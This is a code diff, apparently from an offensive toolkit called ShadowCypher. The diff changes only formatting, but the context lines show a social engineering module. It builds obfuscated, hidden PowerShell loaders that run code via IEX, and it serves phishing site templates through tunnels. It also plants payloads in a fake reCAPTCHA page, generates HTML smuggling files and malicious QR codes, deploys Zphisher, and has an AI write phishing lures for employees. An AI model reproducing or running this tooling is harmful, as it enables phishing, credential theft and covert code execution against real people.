@@ -1,15 +1,17 @@
 """ShadowCypher Social Engineering Assessment Engine."""
 
-import os
-import re
-import zlib
 import base64
+import os
 import random
+import re
 import string
 import subprocess
+import zlib
+
 from shadowcypher.core.logger import logger
 from shadowcypher.core.runner import runner
 from shadowcypher.core.stealth import require_stealth
+
 
 class SocialEngineeringAssessment:
     """Handles social engineering artifact generation and deployment."""
@@ -43,11 +45,11 @@ class SocialEngineeringAssessment:
                 compressed_b64 = base64.b64encode(compressed).decode("utf-8")
                 r1, r2, r3 = [''.join(random.choices(string.ascii_letters, k=8)) for _ in range(3)]
                 result = f'${r1} = "{compressed_b64}"; ${r2} = New-Object IO.MemoryStream(,[Convert]::FromBase64String(${r1})); ${r3} = New-Object IO.Compression.DeflateStream(${r2}, [IO.Compression.CompressionMode]::Decompress); $reader = New-Object IO.StreamReader(${r3}, [Text.Encoding]::UTF8); IEX ($reader.ReadToEnd())'
-            
+
             if use_b64:
                 encoded = base64.b64encode(result.encode("utf-16le")).decode("utf-8")
                 result = f"powershell -NoP -NonI -W Hidden -EncodedCommand {encoded}"
-            
+
             path = f"payloads/obfuscated_{int(random.random()*1000)}.ps1"
             with open(path, "w") as f:
                 f.write(result)
@@ -62,18 +64,18 @@ class SocialEngineeringAssessment:
         site_path = os.path.join("shadowcypher/modules/phish_data/sites", template.lower())
         if not os.path.exists(site_path):
             site_path = "shadowcypher/modules/phish_data/fake-recaptcha"
-        
+
         logger.info("social_eng", f"Launching {template} server on port {port}")
         if on_output:
             on_output(f"[SOCIAL_ENG] ACTIVATING_INFRASTRUCTURE: {template} on port {port}\n")
-        
+
         # Start the local PHP backend
         cmd = ["php", "-S", f"127.0.0.1:{port}"]
         task_id = runner.execute_task(f"SOCIAL_ENG_{template}", cmd, callback=on_output, cwd=site_path)
-        
+
         if use_tunnel:
             SocialEngineeringAssessment.start_secure_tunnel(port, mode=tunnel_mode, on_output=on_output)
-            
+
         return task_id
 
     @staticmethod
@@ -114,20 +116,20 @@ class SocialEngineeringAssessment:
         """Generate a simulated reCAPTCHA artifact with custom execution payload."""
         base_path = "shadowcypher/modules/phish_data/fake-recaptcha"
         js_path = os.path.join(base_path, "src", "fakerecaptcha.js")
-        
+
         if not os.path.exists(js_path):
             return "ERROR: reCAPTCHA assets missing."
-        
+
         try:
             with open(js_path, "r") as f:
                 js_content = f.read()
-            
+
             payload_escaped = payload.replace('"', '\\"')
             new_js = re.sub(r'const payload\s*=\s*`.*?`;', f'const payload = `{payload_escaped}`;', js_content, flags=re.DOTALL)
-            
+
             with open(js_path, "w") as f:
                 f.write(new_js)
-            
+
             return f"SUCCESS: Fake reCAPTCHA configured for {target_os} with diagnostic payload."
         except Exception as e:
             return f"ERROR: reCAPTCHA config failed: {e}"
@@ -137,11 +139,11 @@ class SocialEngineeringAssessment:
         """Generate an HTML smuggling file embedding the target file."""
         if not os.path.exists(file_path):
             return "ERROR: Source file not found."
-        
+
         try:
             with open(file_path, "rb") as f:
                 blob = base64.b64encode(f.read()).decode()
-            
+
             html = f'''
             <html>
                 <body>
@@ -171,7 +173,7 @@ class SocialEngineeringAssessment:
         """Autonomous Zphisher deployment for multi-platform social engineering."""
         project_root = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
         zp_path = os.path.join(project_root, "tools", "zphisher")
-        
+
         if not os.path.exists(zp_path):
             if on_output:
                 on_output("[SYSTEM] ZPHISHER_MISSING: Initiating secure acquisition...")
@@ -185,7 +187,7 @@ class SocialEngineeringAssessment:
                 if on_output:
                     on_output(f"[ERROR] ACQUISITION_FAILED: {e}\n")
                 return
-        
+
         cmd = ["bash", os.path.join(zp_path, "zphisher.sh")]
         return runner.execute_task("ZPHISHER_DEPLOYMENT", cmd, callback=on_output)
 
@@ -225,12 +227,12 @@ class SocialEngineeringAssessment:
     def generate_qr_payload(url):
         """Generate a malicious QR Code for social engineering diagnostics."""
         qr_api = f"https://api.qrserver.com/v1/create-qr-code/?size=300x300&data={url}"
-        
+
         path = f"payloads/qr_code_{int(random.random()*1000)}.html"
         os.makedirs("payloads", exist_ok=True)
         with open(path, "w") as f:
             f.write(f"<html><body><img src='{qr_api}'><br>Target: {url}</body></html>")
-        
+
         return f"SUCCESS: QR Payload generated at {path}"
 
     @staticmethod
@@ -242,10 +244,10 @@ class SocialEngineeringAssessment:
             # Fallback if imported under new class
             from shadowcypher.modules.deephat import PayloadSynthesizer
             deephat = PayloadSynthesizer()
-        
+
         desc = f"Social engineering lure for {target_type} targeting an employee or executive. Hook URL: {hook_url}"
         logger.info("social_eng", f"ENGAGING_AI: Synthesizing {target_type} Lure...")
-        
+
         filename = deephat.generate_payload(desc, category="social_engineering_lure")
         return f"SUCCESS: Professional lure(s) synthesized by AI: {filename}"
 
